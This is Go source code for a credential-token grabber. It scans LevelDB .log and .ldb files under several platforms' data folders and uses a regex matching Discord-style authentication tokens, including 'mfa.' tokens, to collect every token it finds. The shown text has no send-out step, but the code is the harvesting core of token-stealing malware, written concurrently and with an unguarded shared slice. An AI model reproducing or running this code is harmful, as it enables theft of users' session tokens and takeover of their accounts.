package main

import (
	"log"
	"os"
	"regexp"
	"strings"
	"sync"
)

type TOKEN struct {
	browser string
	token   string
}

func findAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func ExtractTokens() []TOKEN {

	var WG sync.WaitGroup
	var T []TOKEN

	for _, Path := range PLATFORMS {
		if !FileExists(Path.DataFiles) {
			continue
		}

		var PLATFORM_PATH string = Path.DataFiles + "\\Local Vault\\leveldb\\"

		items, _ := os.ReadDir(PLATFORM_PATH)
		for _, File := range items {
			FName := File.Name()
			var t []string
			// if the file isn't a log or db file, ignore it
			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
				continue
			}

			// asynchronous regex locator
			WG.Add(1)
			go func(FName string) {
				defer WG.Done()

				b, e := os.ReadFile(PLATFORM_PATH + FName)
				if e != nil {
					log.Fatalf(e.Error())
				}

				t = findAllTokens(string(b))

				if len(t) > 0 {
					// iterate through any/all tokens found
					for _, tk := range t {
						T = append(T, TOKEN{
							browser: Path.Name,
							token:   tk,
						})
					}
				}
			}(FName)
		}
		WG.Wait()
	}
	return T
}
